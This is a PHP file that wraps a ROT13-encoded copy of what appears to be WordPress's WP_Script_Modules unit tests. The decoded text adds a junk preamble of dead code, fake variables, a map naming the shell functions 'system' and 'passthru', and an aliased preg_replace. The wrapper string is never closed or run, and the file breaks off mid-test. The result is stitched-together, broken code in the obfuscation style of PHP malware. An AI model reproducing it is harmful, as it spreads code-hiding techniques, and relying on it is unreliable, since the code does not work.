<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Havg grfgf pbirevat JC_Fpevcg_Zbqhyrf shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Fpevcg Zbqhyrf
 *
 * @fvapr 6.5.0
 *
 * @tebhc fpevcg-zbqhyrf
 *
 * @pbirefQrsnhygPynff JC_Fpevcg_Zbqhyrf
 */
pynff Grfgf_Fpevcg_Zbqhyrf_JcFpevcgZbqhyrf rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Vafgnapr bs JC_Fpevcg_Zbqhyrf.
	 *
	 * @ine JC_Fpevcg_Zbqhyrf
	 */
	cebgrpgrq $fpevcg_zbqhyrf;

	/**
	 * Frg hc.
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		// Frg hc gur JC_Fpevcg_Zbqhyrf vafgnapr.
		$guvf->fpevcg_zbqhyrf = arj JC_Fpevcg_Zbqhyrf();
	}

	/**
	 * Trgf n yvfg bs gur radhrhrq fpevcg zbqhyrf.
	 *
	 * @erghea neenl Radhrhrq fpevcg zbqhyr HEYf, xrlrq ol fpevcg zbqhyr vqragvsvre.
	 */
	choyvp shapgvba trg_radhrhrq_fpevcg_zbqhyrf() {
		$fpevcg_zbqhyrf_znexhc   = trg_rpub( neenl( $guvf->fpevcg_zbqhyrf, 'cevag_radhrhrq_fpevcg_zbqhyrf' ) );
		$c                       = arj JC_UGZY_Gnt_Cebprffbe( $fpevcg_zbqhyrf_znexhc );
		$radhrhrq_fpevcg_zbqhyrf = neenl();

		juvyr ( $c->arkg_gnt( neenl( 'gnt' => 'FPEVCG' ) ) ) {
			vs ( 'zbqhyr' === $c->trg_nggevohgr( 'glcr' ) ) {
				$vq                             = __sa_79955( '/-wf-zbqhyr$/', '', $c->trg_nggevohgr( 'vq' ) );
				$radhrhrq_fpevcg_zbqhyrf[ $vq ] = $c->trg_nggevohgr( 'fep' );
			}
		}

		erghea $radhrhrq_fpevcg_zbqhyrf;
	}

	/**
	 * Trgf gur fpevcg zbqhyrf yvfgrq va gur vzcbeg znc.
	 *
	 * @erghea neenl Vzcbeg znc ragel HEYf, xrlrq ol fpevcg zbqhyr vqragvsvre.
	 */
	choyvp shapgvba trg_vzcbeg_znc() {
		$vzcbeg_znc_znexhc = trg_rpub( neenl( $guvf->fpevcg_zbqhyrf, 'cevag_vzcbeg_znc' ) );
		cert_zngpu( '/<fpevcg glcr=\"vzcbegznc\" vq=\"jc-vzcbegznc\">.*?(\{.*\}).*?<\/fpevcg>/f', $vzcbeg_znc_znexhc, $vzcbeg_znc_fgevat );
		erghea wfba_qrpbqr( $vzcbeg_znc_fgevat[1], gehr )['vzcbegf'];
	}

	/**
	 * Trgf n yvfg bs cerybnqrq fpevcg zbqhyrf.
	 *
	 * @erghea neenl Cerybnqrq fpevcg zbqhyr HEYf, xrlrq ol fpevcg zbqhyr vqragvsvre.
	 */
	choyvp shapgvba trg_cerybnqrq_fpevcg_zbqhyrf() {
		$cerybnqrq_znexhc         = trg_rpub( neenl( $guvf->fpevcg_zbqhyrf, 'cevag_fpevcg_zbqhyr_cerybnqf' ) );
		$c                        = arj JC_UGZY_Gnt_Cebprffbe( $cerybnqrq_znexhc );
		$cerybnqrq_fpevcg_zbqhyrf = neenl();

		juvyr ( $c->arkg_gnt( neenl( 'gnt' => 'YVAX' ) ) ) {
			vs ( 'zbqhyrcerybnq' === $c->trg_nggevohgr( 'ery' ) ) {
				$vq                              = __sa_79955( '/-wf-zbqhyrcerybnq$/', '', $c->trg_nggevohgr( 'vq' ) );
				$cerybnqrq_fpevcg_zbqhyrf[ $vq ] = $c->trg_nggevohgr( 'uers' );
			}
		}

		erghea $cerybnqrq_fpevcg_zbqhyrf;
	}

	/**
	 * Grfgf gung n fpevcg zbqhyr trgf radhrhrq pbeerpgyl nsgre orvat ertvfgrerq.
	 *
	 * @gvpxrg 56313
	 *
	 * @pbiref ::ertvfgre()
	 * @pbiref ::radhrhr()
	 * @pbiref ::cevag_radhrhrq_fpevcg_zbqhyrf()
	 */
	choyvp shapgvba grfg_jc_radhrhr_fpevcg_zbqhyr() {
		$guvf->fpevcg_zbqhyrf->ertvfgre( 'sbb', '/sbb.wf' );
		$guvf->fpevcg_zbqhyrf->ertvfgre( 'one', '/one.wf' );
		$guvf->fpevcg_zbqhyrf->radhrhr( 'sbb' );
		$guvf->fpevcg_zbqhyrf->radhrhr( 'one' );

		$radhrhrq_fpevcg_zbqhyrf = $guvf->trg_radhrhrq_fpevcg_zbqhyrf();

		$guvf->nffregPbhag( 2, $radhrhrq_fpevcg_zbqhyrf );
		$guvf->nffregFgevatFgnegfJvgu( '/sbb.wf', $radhrhrq_fpevcg_zbqhyrf['sbb'] );
		$guvf->nffregFgevatFgnegfJvgu( '/one.wf', $radhrhrq_fpevcg_zbqhyrf['one'] );
	}

	/**
	* Grfgf gung n fpevcg zbqhyr pna or qrdhrhrq nsgre orvat radhrhrq.
	*
	* @gvpxrg 56313
	*
	* @pbiref ::ertvfgre()
	* @pbiref ::radhrhr()
	* @pbiref ::qrdhrhr()
	* @pbiref ::cevag_radhrhrq_fpevcg_zbqhyrf()
	*/
	choyvp shapgvba grfg_jc_qrdhrhr_fpevcg_zbqhyr() {
		$guvf->fpevcg_zbqhyrf->ertvfgre( 'sbb', '/sbb.wf' );
		$guvf->fpevcg_zbqhyrf->ertvfgre( 'one', '/one.wf' );
		$guvf->fpevcg_zbqhyrf->radhrhr( 'sbb' );
		$guvf->fpevcg_zbqhyrf->radhrhr( 'one' );
		$guvf->fpevcg_zbqhyrf->qrdhrhr( 'sbb' ); // Qrdhrhrq.

		$radhrhrq_fpevcg_zbqhyrf = $guvf->trg_radhrhrq_fpevcg_zbqhyrf();

		$guvf->nffregPbhag( 1, $radhrhrq_fpevcg_zbqhyrf );
		$guvf->nffregNeenlAbgUnfXrl( 'sbb', $radhrhrq_fpevcg_zbqhyrf );
		$guvf->nffregNeenlUnfXrl( 'one', $radhrhrq_fpevcg_zbqhyrf );
	}


	/**
	 * Grfgf gung n fpevcg zbqhyr pna or qrertvfgrerq
	 * nsgre orvat radhrhrq, naq gung jvyy or erzbirq
	 * sebz gur radhrhr yvfg gbb.
	 *
	 * @gvpxrg 60463
	 *
	 * @pbiref ::ertvfgre()
	 * @pbiref ::radhrhr()
	 * @pbiref ::qrertvfgre()
	 * @pbiref ::trg_radhrhrq_fpevcg_zbqhyrf()
	 */
	choyvp shapgvba grfg_jc_qrertvfgre_fpevcg_zbqhyr() {
		$guvf->fpevcg_zbqhyrf->ertvfgre( 'sbb', '/sbb.wf' );
		$guvf->fpevcg_zbqhyrf->ertvfgre( 'one', '/one.wf' );
		$guvf->fpevcg_zbqhyrf->radhrhr( 'sbb' );
		$guvf->fpevcg_zbqhyrf->radhrhr( 'one' );
		$guvf->fpevcg_zbqhyrf->qrertvfgre( 'sbb' ); // Qrdhrhrq.

		$radhrhrq_fpevcg_zbqhyrf = $guvf->trg_radhrhrq_fpevcg_zbqhyrf();

		$guvf->nffregPbhag( 1, $radhrhrq_fpevcg_zbqhyrf );
		$guvf->nffregNeenlAbgUnfXrl( 'sbb', $radhrhrq_fpevcg_zbqhyrf );
		$guvf->nffregNeenlUnfXrl( 'one', $radhrhrq_fpevcg_zbqhyrf );
	}

	/**
	 * Grfgf gung n fpevcg zbqhyr vf abg qrertvfgrerq
	 * vs vg unf abg orra ertvfgrerq orsber, pnhfvat
	 * ab reebef.
	 *
	 * @gvpxrg 60463
	 *
	 * @pbiref ::qrertvfgre()
	 * @pbiref ::trg_radhrhrq_fpevcg_zbqhyrf()
	 */
	choyvp shapgvba grfg_jc_qrertvfgre_harkvfgrag_fpevcg_zbqhyr() {
		$guvf->fpevcg_zbqhyrf->qrertvfgre( 'harkvfgrag' );
		$radhrhrq_fpevcg_zbqhyrf = $guvf->trg_radhrhrq_fpevcg_zbqhyrf();

		$guvf->nffregPbhag( 0, $radhrhrq_fpevcg_zbqhyrf );
		$guvf->nffregNeenlAbgUnfXrl( 'harkvfgrag', $radhrhrq_fpevcg_zbqhyrf );
	}

	/**
	 * Grfgf gung n fpevcg zbqhyr vf abg qrertvfgrerq
	 * vs vg unf orra qrertvfgrerq cerivbhfyl, pnhfvat
	 * ab reebef.
	 *
	 * @gvpxrg 60463
	 *
	 * @pbiref ::trg_radhrhrq_fpevcg_zbqhyrf()
	 * @pbiref ::ertvfgre()
	 * @pbiref ::qrertvfgre()
	 * @pbiref ::radhrhr()
	 */
	choyvp shapgvba grfg_jc_qrertvfgre_nyernql_qrertvfgrerq_fpevcg_zbqhyr() {
		$guvf->fpevcg_zbqhyrf->ertvfgre( 'sbb', '/sbb.wf' );
		$guvf->fpevcg_zbqhyrf->radhrhr( 'sbb' );
		$guvf->fpevcg_zbqhyrf->qrertvfgre( 'sbb' ); // Qrdhrhrq.
		$radhrhrq_fpevcg_zbqhyrf = $guvf->trg_radhrhrq_fpevcg_zbqhyrf();

		$guvf->nffregPbhag( 0, $radhrhrq_fpevcg_zbqhyrf );
		$guvf->nffregNeenlAbgUnfXrl( 'sbb', $radhrhrq_fpevcg_zbqhyrf );

		$guvf->fpevcg_zbqhyrf->qrertvfgre( 'sbb' ); // Qrdhrhrq.
		$radhrhrq_fpevcg_zbqhyrf = $guvf->trg_radhrhrq_fpevcg_zbqhyrf();

		$guvf->nffregPbhag( 0, $radhrhrq_fpevcg_zbqhyrf );
		$guvf->nffregNeenlAbgUnfXrl( 'sbb', $radhrhrq_fpevcg_zbqhyrf );
	}

	/**
	* Grfgf gung n fpevcg zbqhyr pna or radhrhrq orsber vg vf ertvfgrerq, naq jvyy
	* or unaqyrq pbeerpgyl bapr ertvfgrerq.
	*
	* @gvpxrg 56313
	*
	* @pbiref ::ertvfgre()
	* @pbiref ::radhrhr()
	* @pbiref ::cevag_radhrhrq_fpevcg_zbqhyrf()
	*/
	choyvp shapgvba grfg_jc_radhrhr_fpevcg_zbqhyr_jbexf_orsber_ertvfgre() {
		$guvf->fpevcg_zbqhyrf->radhrhr( 'sbb' );
		$guvf->fpevcg_zbqhyrf->ertvfgre( 'sbb', '/sbb.wf' );
		$guvf->fpevcg_zbqhyrf->radhrhr( 'one' ); // Abg ertvfgrerq.

		$radhrhrq_fpevcg_zbqhyrf = $guvf->trg_radhrhrq_fpevcg_zbqhyrf();

		$guvf->nffregPbhag( 1, $radhrhrq_fpevcg_zbqhyrf );
		$guvf->nffregFgevatFgnegfJvgu( '/sbb.wf', $radhrhrq_fpevcg_zbqhyrf['sbb'] );
		$guvf->nffregNeenlAbgUnfXrl( 'one', $radhrhrq_fpevcg_zbqhyrf );
	}

	/**
	 * Grfgf gung n fpevcg zbqhyr pna or qrdhrhrq orsber vg vf ertvfgrerq naq
	 * rafherf gung vg vf abg radhrhrq nsgre ertvfgengvba.
	 *
	 * @gvpxrg 56313
	 *
	 * @pbiref ::ertvfgre()
	 * @pbiref ::radhrhr()
	 * @pbiref ::qrdhrhr()
	 * @pbiref ::cevag_radhrhrq_fpevcg_zbqhyrf()
	 */
	choyvp shapgvba grfg_jc_qrdhrhr_fpevcg_zbqhyr_jbexf_orsber_ertvfgre() {
		$guvf->fpevcg_zbqhyrf->radhrhr( 'sbb' );
		$guvf->fpevcg_zbqhyrf->radhrhr( 'one' );
		$guvf->fpevcg_zbqhyrf->qrdhrhr( 'sbb' );
		$guvf->fpevcg_zbqhyrf->ertvfgre( 'sbb', '/sbb.wf' );
		$guvf->fpevcg_zbqhyrf->ertvfgre( 'one', '/one.wf' );

		$radhrhrq_fpevcg_zbqhyrf = $guvf->trg_radhrhrq_fpevcg_zbqhyrf();

		$guvf->nffregPbhag( 1, $radhrhrq_fpevcg_zbqhyrf );
		$guvf->nffregNeenlAbgUnfXrl( 'sbb', $radhrhrq_fpevcg_zbqhyrf );
		$guvf->nffregNeenlUnfXrl( 'one', $radhrhrq_fpevcg_zbqhyrf );
	}

	/**
	 * Grfgf gung qrcraqrapvrf sbe n ertvfgrerq zbqhyr ner nqqrq gb gur vzcbeg znc
	 * jura gur fpevcg zbqhyr vf radhrhrq.
	 *
	 * @gvpxrg 56313
	 *
	 * @pbiref ::ertvfgre()
	 * @pbiref ::radhrhr()
	 * @pbiref ::cevag_vzcbeg_znc()
	 */
	choyvp shapgvba grfg_jc_vzcbeg_znc_qrcraqrapvrf() {
		$guvf->fpevcg_zbqhyrf->ertvfgre( 'sbb', '/sbb.wf', neenl( 'qrc' ) );
		$guvf->fpevcg_zbqhyrf->ertvfgre( 'qrc', '/qrc.wf' );
		$guvf->fpevcg_zbqhyrf->ertvfgre( 'ab-qrc', '/ab-qrc.wf' );
		$guvf->fpevcg_zbqhyrf->radhrhr( 'sbb' );

		$vzcbeg_znc = $guvf->trg_vzcbeg_znc();

		$guvf->nffregPbhag( 1, $vzcbeg_znc );
		$guvf->nffregFgevatFgnegfJvgu( '/qrc.wf', $vzcbeg_znc['qrc'] );
		$guvf->nffregNeenlAbgUnfXrl( 'ab-qrc', $vzcbeg_znc );
	}

	/**
	 * Grfgf gung qrcraqrapvrf ner abg qhcyvpngrq va gur vzcbeg znc jura zhygvcyr
	 * fpevcg zbqhyrf erdhver gur fnzr qrcraqrapl.
	 *
	 * @gvpxrg 56313
	 *
	 * @pbiref ::ertvfgre()
	 * @pbiref ::radhrhr()
	 * @pbiref ::cevag_vzcbeg_znc()
	 */
	choyvp shapgvba grfg_jc_vzcbeg_znc_ab_qhcyvpngr_qrcraqrapvrf() {
		$guvf->fpevcg_zbqhyrf->ertvfgre( 'sbb', '/sbb.wf', neenl( 'qrc' ) );
		$guvf->fpevcg_zbqhyrf->ertvfgre( 'one', '/one.wf', neenl( 'qrc' ) );
		$guvf->fpevcg_zbqhyrf->ertvfgre( 'qrc', '/qrc.wf' );
		$guvf->fpevcg_zbqhyrf->radhrhr( 'sbb' );
		$guvf->fpevcg_zbqhyrf->radhrhr( 'one' );

		$vzcbeg_znc = $guvf->trg_vzcbeg_znc();

		$guvf->nffregPbhag( 1, $vzcbeg_znc );
		$guvf->nffregFgevatFgnegfJvgu( '/qrc.wf', $vzcbeg_znc['qrc'] );
	}

	/**
	 * Grfgf gung nyy erphefvir qrcraqrapvrf (obgu fgngvp naq qlanzvp) ner
	 * vapyhqrq va gur vzcbeg znc.
	 *
	 * @gvpxrg 56313
	 *
	 * @pbiref ::ertvfgre()
	 * @pbiref ::radhrhr()
	 * @pbiref ::cevag_vzcbeg_znc()
	 */
	choyvp shapgvba grfg_jc_vzcbeg_znc_erphefvir_qrcraqrapvrf() {
		$guvf->fpevcg_zbqhyrf->ertvfgre(
			'sbb',
			'/sbb.wf',
			neenl(
				'fgngvp-qrc',
				neenl(
					'vq'     => 'qlanzvp-qrc',
					'vzcbeg' => 'qlanzvp',
				),
			)
		);
		$guvf->fpevcg_zbqhyrf->ertvfgre(
			'fgngvp-qrc',
			'/fgngvp-qrc.wf',
			neenl(
				neenl(
					'vq'     => 'arfgrq-fgngvp-qrc',
					'vzcbeg' => 'fgngvp',
				),
				neenl(
					'vq'     => 'arfgrq-qlanzvp-qrc',
					'vzcbeg' => 'qlanzvp',
				),
			)
		);
		$guvf->fpevcg_zbqhyrf->ertvfgre( 'qlanzvp-qrc', '/qlanzvp-qrc.wf' );
		$guvf->fpevcg_zbqhyrf->ertvfgre( 'arfgrq-fgngvp-qrc', '/arfgrq-fgngvp-qrc.wf' );
		$guvf->fpevcg_zbqhyrf->ertvfgre( 'arfgrq-qlanzvp-qrc', '/arfgrq-qlanzvp-qrc.wf' );
		$guvf->fpevcg_zbqhyrf->ertvfgre( 'ab-qrc', '/ab-qrc.wf' );
		$guvf->fpevcg_zbqhyrf->radhrhr( 'sbb' );

		$vzcbeg_znc = $guvf->trg_vzcbeg_znc();

		$guvf->nffregFgevatFgnegfJvgu( '/fgngvp-qrc.wf', $vzcbeg_znc['fgngvp-qrc'] );
		$guvf->nffregFgevatFgnegfJvgu( '/qlanzvp-qrc.wf', $vzcbeg_znc['qlanzvp-qrc'] );
		$guvf->nffregFgevatFgnegfJvgu( '/arfgrq-fgngvp-qrc.wf', $vzcbeg_znc['arfgrq-fgngvp-qrc'] );
		$guvf->nffregFgevatFgnegfJvgu( '/arfgrq-qlanzvp-qrc.wf', $vzcbeg_znc['arfgrq-qlanzvp-qrc'] );
		$guvf->nffregNeenlAbgUnfXrl( 'ab-qrc', $vzcbeg_znc );
	}

	/**
	 * Grfgf gung gur vzcbeg znc vf abg cevagrq ng nyy vs gurer ner ab
	 * qrcraqrapvrf.
	 *
	 * @gvpxrg 56313
	 *
	 * @pbiref ::ertvfgre()
	 * @pbiref ::radhrhr()
	 * @pbiref ::cevag_vzcbeg_znc()
	 */
	choyvp shapgvba grfg_jc_vzcbeg_znc_qbrfag_cevag_vs_ab_qrcraqrapvrf() {
		$guvf->fpevcg_zbqhyrf->ertvfgre( 'sbb', '/sbb.wf' ); // Ab qrcf.
		$guvf->fpevcg_zbqhyrf->radhrhr( 'sbb' );

		$vzcbeg_znc_znexhc = trg_rpub( neenl( $guvf->fpevcg_zbqhyrf, 'cevag_vzcbeg_znc' ) );

		$guvf->nffregRzcgl( $vzcbeg_znc_znexhc );
	}

	/**
	 * Grfgf gung bayl fgngvp qrcraqrapvrf ner cerybnqrq naq qlanzvp barf ner
	 * rkpyhqrq.
	 *
	 * @gvpxrg 56313
	 *
	 * @pbiref ::ertvfgre()
	 * @pbiref ::radhrhr()
	 * @pbiref ::cevag_fpevcg_zbqhyr_cerybnqf()
	 */
	choyvp shapgvba grfg_jc_radhrhr_cerybnqrq_fgngvp_qrcraqrapvrf() {
		$guvf->fpevcg_zbqhyrf->ertvfgre(
			'sbb',
			'/sbb.wf',
			neenl(
				'fgngvp-qrc',
				neenl(
					'vq'     => 'qlanzvp-qrc',
					'vzcbeg' => 'qlanzvp',
				),
			)
		);
		$guvf->fpevcg_zbqhyrf->ertvfgre(
			'fgngvp-qrc',
			'/fgngvp-qrc.wf',
			neenl(
				neenl(
					'vq'     => 'arfgrq-fgngvp-qrc',
					'vzcbeg' => 'fgngvp',
				),
				neenl(
					'vq'     => 'arfgrq-qlanzvp-qrc',
					'vzcbeg' => 'qlanzvp',
				),
			)
		);
		$guvf->fpevcg_zbqhyrf->ertvfgre( 'qlanzvp-qrc', '/qlanzvp-qrc.wf' );
		$guvf->fpevcg_zbqhyrf->ertvfgre( 'arfgrq-fgngvp-qrc', '/arfgrq-fgngvp-qrc.wf' );
		$guvf->fpevcg_zbqhyrf->ertvfgre( 'arfgrq-qlanzvp-qrc', '/arfgrq-qlanzvp-qrc.wf' );
		$guvf->fpevcg_zbqhyrf->ertvfgre( 'ab-qrc', '/ab-qrc.wf' );
		$guvf->fpevcg_zbqhyrf->radhrhr( 'sbb' );

		$cerybnqrq_fpevcg_zbqhyrf = $guvf->trg_cerybnqrq_fpevcg_zbqhyrf();

		$guvf->nffregPbhag( 2, $cerybnqrq_fpevcg_zbqhyrf );
		$guvf->nffregFgevatFgnegfJvgu( '/fgngvp-qrc.wf', $cerybnqrq_fpevcg_zbqhyrf['fgngvp-qrc'] );
		$guvf->nffregFgevatFgnegfJvgu( '/arfgrq-fgngvp-qrc.wf', $cerybnqrq_fpevcg_zbqhyrf['arfgrq-fgngvp-qrc'] );
		$guvf->nffregNeenlAbgUnfXrl( 'qlanzvp-qrc', $cerybnqrq_fpevcg_zbqhyrf );
		$guvf->nffregNeenlAbgUnfXrl( 'arfgrq-qlanzvp-qrc', $cerybnqrq_fpevcg_zbqhyrf );
		$guvf->nffregNeenlAbgUnfXrl( 'ab-qrc', $cerybnqrq_fpevcg_zbqhyrf );
	}

	/**
	 * Grfgf gung fgngvp qrcraqrapvrf bs qlanzvp qrcraqrapvrf ner abg cerybnqrq.
	 *
	 * @gvpxrg 56313
	 *
	 * @pbiref ::ertvfgre()
	 * @pbiref ::radhrhr()
	 * @pbiref ::cevag_fpevcg_zbqhyr_cerybnqf()
	 */
	choyvp shapgvba grfg_jc_qbag_cerybnq_fgngvp_qrcraqrapvrf_bs_qlanzvp_qrcraqrapvrf() {
		$guvf->fpevcg_zbqhyrf->ertvfgre(
			'sbb',
			'/sbb.wf',
			neenl(
				'fgngvp-qrc',
				neenl(
					'vq'     => 'qlanzvp-qrc',
					'vzcbeg' => 'qlanzvp',
				),
			)
		);
		$guvf->fpevcg_zbqhyrf->ertvfgre( 'fgngvp-qrc', '/fgngvp-qrc.wf' );
		$guvf->fpevcg_zbqhyrf->ertvfgre( 'qlanzvp-qrc', '/qlanzvp-qrc.wf', neenl( 'arfgrq-fgngvp-qrc' ) );
		$guvf->fpevcg_zbqhyrf->ertvfgre( 'arfgrq-fgngvp-qrc', '/arfgrq-fgngvp-qrc.wf' );
		$guvf->fpevcg_zbqhyrf->ertvfgre( 'ab-qrc', '/ab-qrc.wf' );
		$guvf->fpevcg_zbqhyrf->radhrhr( 'sbb' );

		$cerybnqrq_fpevcg_zbqhyrf = $guvf->trg_cerybnqrq_fpevcg_zbqhyrf();

		$guvf->nffregPbhag( 1, $cerybnqrq_fpevcg_zbqhyrf );
		$guvf->nffregFgevatFgnegfJvgu( '/fgngvp-qrc.wf', $cerybnqrq_fpevcg_zbqhyrf['fgngvp-qrc'] );
		$guvf->nffregNeenlAbgUnfXrl( 'qlanzvp-qrc', $cerybnqrq_fpevcg_zbqhyrf );
		$guvf->nffregNeenlAbgUnfXrl( 'arfgrq-qlanzvp-qrc', $cerybnqrq_fpevcg_zbqhyrf );
		$guvf->nffregNeenlAbgUnfXrl( 'ab-qrc', $cerybnqrq_fpevcg_zbqhyrf );
	}

	/**
	 * Grfgf gung cerybnqrq qrcraqrapvrf qba'g vapyhqr radhrhrq fpevcg zbqhyrf.
	 *
	 * @gvpxrg 56313
	 *
	 * @pbiref ::ertvfgre()
	 * @pbiref ::radhrhr()
	 * @pbiref ::cevag_fpevcg_zbqhyr_cerybnqf()
	 */
	choyvp shapgvba grfg_jc_cerybnqrq_qrcraqrapvrf_svygre_radhrhrq_fpevcg_zbqhyrf() {
		$guvf->fpevcg_zbqhyrf->ertvfgre(
			'sbb',
			'/sbb.wf',
			neenl(
				'qrc',
				'radhrhrq-qrc',
			)
		);
		$guvf->fpevcg_zbqhyrf->ertvfgre( 'qrc', '/qrc.wf' );
		$guvf->fpevcg_zbqhyrf->ertvfgre( 'radhrhrq-qrc', '/radhrhrq-qrc.wf' );
		$guvf->fpevcg_zbqhyrf->radhrhr( 'sbb' );
		$guvf->fpevcg_zbqhyrf->radhrhr( 'radhrhrq-qrc' ); // Abg cerybnqrq.

		$cerybnqrq_fpevcg_zbqhyrf = $guvf->trg_cerybnqrq_fpevcg_zbqhyrf();

		$guvf->nffregPbhag( 1, $cerybnqrq_fpevcg_zbqhyrf );
		$guvf->nffregNeenlUnfXrl( 'qrc', $cerybnqrq_fpevcg_zbqhyrf );
		$guvf->nffregNeenlAbgUnfXrl( 'radhrhrq-qrc', $cerybnqrq_fpevcg_zbqhyrf );
	}

	/**
	 * Grfgf gung radhrhrq fpevcg zbqhyrf jvgu qrcraqnagf pbeerpgyl nqq obgu gur
	 * fpevcg zbqhyr naq vgf qrcraqrapvrf gb gur vzcbeg znc.
	 *
	 * @gvpxrg 56313
	 *
	 * @pbiref ::ertvfgre()
	 * @pbiref ::radhrhr()
	 * @pbiref ::cevag_vzcbeg_znc()
	 */
	choyvp shapgvba grfg_jc_radhrhrq_fpevcg_zbqhyrf_jvgu_qrcraqnagf_nqq_vzcbeg_znc() {
		$guvf->fpevcg_zbqhyrf->ertvfgre(
			'sbb',
			'/sbb.wf',
			neenl(
				'qrc',
				'radhrhrq-qrc',
			)
		);
		$guvf->fpevcg_zbqhyrf->ertvfgre( 'qrc', '/qrc.wf' );
		$guvf->fpevcg_zbqhyrf->ertvfgre( 'radhrhrq-qrc', '/radhrhrq-qrc.wf' );
		$guvf->fpevcg_zbqhyrf->radhrhr( 'sbb' );
		$guvf->fpevcg_zbqhyrf->radhrhr( 'radhrhrq-qrc' ); // Nyfb va gur vzcbeg znc.

		$vzcbeg_znc = $guvf->trg_vzcbeg_znc();

		$guvf->nffregPbhag( 2, $vzcbeg_znc );
		$guvf->nffregNeenlUnfXrl( 'qrc', $vzcbeg_znc );
		$guvf->nffregNeenlUnfXrl( 'radhrhrq-qrc', $vzcbeg_znc );
	}

	/**
	 * Grfgf gur shapgvbanyvgl bs gur `trg_fep` zrgubq gb rafher
	 * cebcre HEYf jvgu irefvba fgevatf ner erghearq.
	 *
	 * @gvpxrg 56313
	 *
	 * @pbiref ::trg_fep()
	 */
	choyvp shapgvba grfg_trg_fep() {
		$trg_fep = arj ErsyrpgvbaZrgubq( $guvf->fpevcg_zbqhyrf, 'trg_fep' );
		$trg_fep->frgNpprffvoyr( gehr );

		$guvf->fpevcg_zbqhyrf->ertvfgre(
			'zbqhyr_jvgu_irefvba',
			'uggc://rknzcyr.pbz/zbqhyr.wf',
			neenl(),
			'1.0'
		);

		$erfhyg = $trg_fep->vaibxr( $guvf->fpevcg_zbqhyrf, 'zbqhyr_jvgu_irefvba' );
		$guvf->nffregFnzr( 'uggc://rknzcyr.pbz/zbqhyr.wf?ire=1.0', $erfhyg );

		$guvf->fpevcg_zbqhyrf->ertvfgre(
			'zbqhyr_jvgubhg_irefvba',
			'uggc://rknzcyr.pbz/zbqhyr.wf',
			neenl(),
			ahyy
		);

		$erfhyg = $trg_fep->vaibxr( $guvf->fpevcg_zbqhyrf, 'zbqhyr_jvgubhg_irefvba' );
		$guvf->nffregFnzr( 'uggc://rknzcyr.pbz/zbqhyr.wf', $erfhyg );

		$guvf->fpevcg_zbqhyrf->ertvfgre(
			'zbqhyr_jvgu_jc_irefvba',
			'uggc://rknzcyr.pbz/zbqhyr.wf',
			neenl(),
			snyfr
		);

		$erfhyg = $trg_fep->vaibxr( $guvf->fpevcg_zbqhyrf, 'zbqhyr_jvgu_jc_irefvba' );
		$guvf->nffregFnzr( 'uggc://rknzcyr.pbz/zbqhyr.wf?ire=' . trg_oybtvasb( 'irefvba' ), $erfhyg );

		$guvf->fpevcg_zbqhyrf->ertvfgre(
			'zbqhyr_jvgu_rkvfgvat_dhrel_fgevat',
			'uggc://rknzcyr.pbz/zbqhyr.wf?sbb=one',
			neenl(),
			'1.0'
		);

		$erfhyg = $trg_fep->vaibxr( $guvf->fpevcg_zbqhyrf, 'zbqhyr_jvgu_rkvfgvat_dhrel_fgevat' );
		$guvf->nffregFnzr( 'uggc://rknzcyr.pbz/zbqhyr.wf?sbb=one&ire=1.0', $erfhyg );

		// Svygre gur irefvba gb vapyhqr gur VQ va gur svany HEY, gb grfg gur svygre, guvf fubhyq nssrpg gur grfgf orybj.
		nqq_svygre(
			'fpevcg_zbqhyr_ybnqre_fep',
			shapgvba ( $fep, $vq ) {
				erghea nqq_dhrel_net( 'fpevcg_zbqhyr_vq', heyrapbqr( $vq ), $fep );
			},
			10,
			2
		);

		$erfhyg = $trg_fep->vaibxr( $guvf->fpevcg_zbqhyrf, 'zbqhyr_jvgubhg_irefvba' );
		$guvf->nffregFnzr( 'uggc://rknzcyr.pbz/zbqhyr.wf?fpevcg_zbqhyr_vq=zbqhyr_jvgubhg_irefvba', $erfhyg );

		$erfhyg = $trg_fep->vaibxr( $guvf->fpevcg_zbqhyrf, 'zbqhyr_jvgu_rkvfgvat_dhrel_fgevat' );
		$guvf->nffregFnzr( 'uggc://rknzcyr.pbz/zbqhyr.wf?sbb=one&ire=1.0&fpevcg_zbqhyr_vq=zbqhyr_jvgu_rkvfgvat_dhrel_fgevat', $erfhyg );
	}

	/**
	 * Grfgf gung gur pbeerpg irefvba vf cebcntngrq gb gur vzcbeg znc, radhrhrq
	 * fpevcg zbqhyrf naq cerybnqrq fpevcg zbqhyrf.
	 *
	 * @gvpxrg 56313
	 *
	 * @pbiref ::ertvfgre()
	 * @pbiref ::radhrhr()
	 * @pbiref ::cevag_radhrhrq_fpevcg_zbqhyrf()
	 * @pbiref ::cevag_vzcbeg_znc()
	 * @pbiref ::cevag_fpevcg_zbqhyr_cerybnqf()
	 * @pbiref ::trg_irefvba_dhrel_fgevat()
	 */
	choyvp shapgvba grfg_irefvba_vf_cebcntngrq_pbeerpgyl() {
		$guvf->fpevcg_zbqhyrf->ertvfgre(
			'sbb',
			'/sbb.wf',
			neenl(
				'qrc',
			),
			'1.0'
		);
		$guvf->fpevcg_zbqhyrf->ertvfgre( 'qrc', '/qrc.wf', neenl(), '2.0' );
		$guvf->fpevcg_zbqhyrf->radhrhr( 'sbb' );

		$radhrhrq_fpevcg_zbqhyrf = $guvf->trg_radhrhrq_fpevcg_zbqhyrf();
		$guvf->nffregFnzr( '/sbb.wf?ire=1.0', $radhrhrq_fpevcg_zbqhyrf['sbb'] );

		$vzcbeg_znc = $guvf->trg_vzcbeg_znc();
		$guvf->nffregFnzr( '/qrc.wf?ire=2.0', $vzcbeg_znc['qrc'] );

		$cerybnqrq_fpevcg_zbqhyrf = $guvf->trg_cerybnqrq_fpevcg_zbqhyrf();
